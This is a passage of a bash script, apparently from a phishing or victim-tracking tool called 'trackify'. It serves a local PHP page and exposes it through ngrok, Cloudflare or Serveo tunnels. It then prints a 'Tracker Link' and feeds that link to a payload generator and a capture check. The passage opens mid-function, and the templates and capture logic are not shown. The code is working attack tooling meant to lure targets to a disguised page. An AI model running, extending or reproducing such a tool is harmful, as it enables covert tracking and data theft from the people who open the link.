if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
fi
else
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
fi

checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Tracker link is not generating, check following possible reason  \e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Tracker Link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
payload_ngrok
checkfound
}

trackify() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }

select_notification
select_template
select_tunnel

# Check SSH requirement only for Serveo
if [[ $option_tunnel -eq 3 ]]; then
    command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
fi

start

}


payload() {

# Strip ANSI codes and extract URL - try multiple methods
send_link=$(cat sendlink 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' | grep -oE "https://[^[:space:]]*" | head -n1)
if [[ -z "$send_link" ]]; then
    # Alternative: extract any https URL pattern
    send_link=$(cat sendlink 2>/dev/null | tr -d '\r' | sed 's/\x1b\[[0-9;]*m//g' | grep -oE "https://[a-zA-Z0-9\-\.]+\.(serveo\.net|serveousercontent\.com)" | head -n1)
fi
if [[ -z "$send_link" ]]; then
    # Last resort: extract anything that looks like a URL
    send_link=$(cat sendlink 2>/dev/null | sed 's/.*https:\/\///' | sed 's/[[:space:]].*//' | head -n1)
    if [[ -n "$send_link" && "$send_link" != *"https://"* ]]; then
        send_link="https://$send_link"
    fi
fi

# Check if we successfully extracted a link
if [[ -z "$send_link" ]]; then
    printf '\e[1;31m[!] Error: Could not extract link for payload generation\e[0m\n'
    printf '\e[1;93m[!] Please check the sendlink file or try again\e[0m\n'
    return 1
fi

generate_payload "$send_link"

}

start() {

if [[ $option_tunnel -eq 1 ]]; then
    # Ngrok
    ngrok_server
elif [[ $option_tunnel -eq 2 ]]; then
    # Cloudflare Tunnel
    cloudflared_server
    if [[ $? -eq 0 ]]; then
        checkfound
    else
        printf "\e[1;31m[!] Failed to start Cloudflare tunnel\e[0m\n"
        exit 1
    fi
elif [[ $option_tunnel -eq 3 ]]; then
    # Serveo
    server
    payload
    checkfound
else
    printf "\e[1;31m[!] Invalid tunnel option\e[0m\n"
    exit 1
fi

}

banner
dependencies
trackify
